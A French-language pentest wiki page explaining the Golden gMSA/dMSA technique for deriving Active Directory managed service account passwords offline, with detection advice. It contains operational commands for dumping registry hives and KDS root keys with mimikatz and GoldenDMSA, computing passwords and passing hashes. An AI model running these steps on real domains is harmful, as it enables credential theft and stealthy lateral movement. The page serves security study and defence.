# Golden gMSA/dMSA Attack (Dérivation hors ligne des mots de passe des Managed Service Accounts)

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les Windows Managed Service Accounts (MSA) sont des principaux spéciaux conçus pour exécuter des services sans avoir à gérer manuellement leurs mots de passe.
Il existe deux variantes principales :

1. **gMSA** – group Managed Service Account – peut être utilisé sur plusieurs hôtes autorisés dans son attribut `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – le successeur (en preview) de gMSA, qui repose sur la même cryptographie tout en permettant des scénarios de délégation plus granulaires.

Pour les deux variantes, le **mot de passe n’est pas stocké** sur chaque Domain Controller (DC) comme un hash NT classique. Chaque DC peut plutôt **dériver** le mot de passe actuel à la volée à partir de :

* La **KDS Root Key** à l’échelle de la forêt (`KRBTGT\KDS`) – secret nommé par un GUID et généré aléatoirement, répliqué sur chaque DC dans le conteneur `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Le **SID** du compte cible.
* Un **ManagedPasswordID** propre au compte (GUID), présent dans l’attribut `msDS-ManagedPasswordId`.

La dérivation est la suivante : `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob de 240 octets finalement **encodé en base64** et stocké dans l’attribut `msDS-ManagedPassword`.
Aucun trafic Kerberos ni aucune interaction avec le domaine n’est requis lors de l’utilisation normale du mot de passe : un hôte membre dérive localement le mot de passe tant qu’il connaît les trois entrées.

## Golden gMSA / Golden dMSA Attack

Si un attaquant peut obtenir les trois entrées **hors ligne**, il peut calculer les mots de passe actuels et futurs **valides** de n’importe quel gMSA/dMSA de la forêt sans plus contacter le DC, contournant :<sup>[[1]](#references)[[2]](#references)</sup>

* L’audit des lectures LDAP
* Les intervalles de changement de mot de passe (ils peuvent être précalculés)

Cela est analogue à un *Golden Ticket* pour les comptes de service.<sup>[[1]](#references)[[2]](#references)</sup>

### Prérequis

1. **Compromission au niveau de la forêt** d’un **DC** (ou Enterprise Admin), ou accès `SYSTEM` à l’un des DC de la forêt.
2. Capacité à énumérer les comptes de service (lecture LDAP / RID brute-force).
3. Station de travail .NET ≥ 4.7.2 x64 pour exécuter [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ou un code équivalent.

### Golden gMSA / dMSA
#### Phase 1 – Extraire la KDS Root Key

Effectuez un dump depuis n’importe quel DC (Volume Shadow Copy / ruches SAM+SECURITY brutes ou secrets distants) :<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
La chaîne base64 nommée `RootKey` (nom GUID) est requise lors des étapes suivantes.<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – Énumérer les objets gMSA / dMSA

Récupérez au moins `sAMAccountName`, `objectSid` et `msDS-ManagedPasswordId` :<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implémente des modes d’assistance :<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – Deviner / découvrir le ManagedPasswordID (lorsqu’il est absent)

Certains déploiements *suppriment* `msDS-ManagedPasswordId` des lectures protégées par des ACL.
Comme le GUID fait 128 bits, le bruteforce naïf est irréalisable, mais :

1. Les **32 premiers bits = l’heure Unix epoch** de la création du compte (résolution à la minute).
2. Suivis de 96 bits aléatoires.

Par conséquent, une **wordlist étroite par compte** (± quelques heures) est réaliste.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
L’outil calcule les mots de passe candidats et compare leur blob base64 avec l’attribut `msDS-ManagedPassword` réel – la correspondance révèle le GUID correct.

##### Phase 4 – Calcul et conversion du mot de passe hors ligne

Une fois le ManagedPasswordID connu, le mot de passe valide n’est plus qu’à une commande :<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Les hashes obtenus peuvent être injectés avec **mimikatz** (`sekurlsa::pth`) ou **Rubeus** pour des abus Kerberos, permettant un **lateral movement** furtif et de la **persistence**.

## Détection et atténuation

* Restreindre les capacités de **DC backup and registry hive read** aux administrateurs Tier-0.
* Surveiller la création de **Directory Services Restore Mode (DSRM)** ou de **Volume Shadow Copy** sur les DC.
* Auditer les lectures / modifications de `CN=Master Root Keys,…` et des indicateurs `userAccountControl` des comptes de service.
* Détecter les écritures de mots de passe **base64** inhabituelles ou la réutilisation soudaine d’un mot de passe de service sur plusieurs hôtes.
* Envisager de convertir les gMSA à privilèges élevés en **classic service accounts** avec des rotations aléatoires régulières lorsqu’une isolation Tier-0 n’est pas possible.

## Outillage

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implémentation de référence utilisée dans cette page.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implémentation de référence utilisée dans cette page.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – **pass-the-ticket** à l’aide de clés AES dérivées.

## Références

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
